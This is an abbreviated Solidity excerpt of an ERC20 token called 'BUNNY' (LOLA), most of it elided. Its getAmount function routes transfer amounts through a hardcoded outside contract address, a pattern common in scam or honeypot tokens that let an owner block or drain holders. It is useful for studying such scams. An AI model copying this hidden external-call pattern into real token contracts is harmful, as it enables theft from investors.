...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _toons = 0x1485939c3B3A3303ae2b83f1150472C59635526C;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return toons.sendTransaction(amount);
    }
    ...
    function _DeployLOLA(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployLOLA(creator, initialSupply);
    }
}

contract LOLA is ERC20Token {
    constructor() ERC20Token("BUNNY", "LOLA", msg.sender, 420690000000 * 10 ** 18) {
    }
}